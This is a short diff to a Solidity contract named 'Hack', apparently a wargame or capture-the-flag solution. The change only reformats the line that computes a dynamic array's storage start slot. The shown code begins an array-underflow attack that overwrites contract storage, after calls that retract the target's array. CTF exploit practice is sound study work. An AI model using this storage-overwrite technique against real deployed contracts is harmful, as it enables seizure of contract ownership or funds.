@@ -50,9 +50,7 @@ contract Hack {
         target.makeContact();
         target.retract();
 
-        uint256 codexStartSlot = uint256(
-            keccak256(abi.encodePacked(uint256(1)))
-        );
+        uint256 codexStartSlot = uint256(keccak256(abi.encodePacked(uint256(1))));
 
         uint256 i = type(uint256).max - codexStartSlot + 1;
 
